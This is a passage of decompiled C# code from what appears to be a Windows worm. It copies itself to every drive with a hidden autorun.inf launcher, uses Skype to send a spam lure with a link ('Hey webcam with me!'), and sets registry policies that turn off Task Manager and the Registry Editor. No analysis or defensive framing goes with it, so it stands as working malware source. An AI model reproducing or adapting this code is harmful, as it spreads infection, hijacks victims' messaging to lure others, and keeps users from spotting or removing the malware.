					programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
					goto IL_0042;
					IL_0042:
					num = 4;
					logicalDrives = Directory.GetLogicalDrives();
					goto IL_004b;
					IL_004b:
					num = 5;
					array = logicalDrives;
					num5 = 0;
					goto IL_0053;
					IL_0053:
					if (num5 < array.Length)
					{
						text = array[num5];
						goto IL_0062;
					}
					goto end_IL_0000_2;
					IL_00f5:
					num = 14;
					goto IL_0053;
					IL_0062:
					num = 6;
					if (!programFiles.Contains(text))
					{
						goto IL_0071;
					}
					goto IL_00fe;
					IL_0071:
					num = 8;
					goto IL_0074;
					IL_0074:
					num = 9;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + "HDDFile.com", (UIOption)(-1), (UICancelOption)2);
					goto IL_0099;
					IL_0099:
					num = 10;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text + "autorun.inf", "[autorun]\r\nopen=" + text + "HDDFile.com\r\nshellexecute=" + text, true);
					goto IL_00c9;
					IL_00c9:
					num = 11;
					FileSystem.SetAttr(text + "HDDFile.com", (FileAttribute)2);
					goto IL_00de;
					IL_00de:
					num = 12;
					FileSystem.SetAttr(text + "autorun.inf", (FileAttribute)2);
					goto IL_00fe;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 343;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		TextBox1.get_Text();
		if (GetActiveWindowTitle().ToString().Contains("Skype"))
		{
			SendKeys.Send("{ENTER}");
			SendKeys.Send("Hey webcam with me! http://TlNYCHAT.COM/chanb ");
			SendKeys.Send("{ENTER}");
		}
	}

	public void Mgr()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 71:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 71;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Reg()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 71:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 71;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
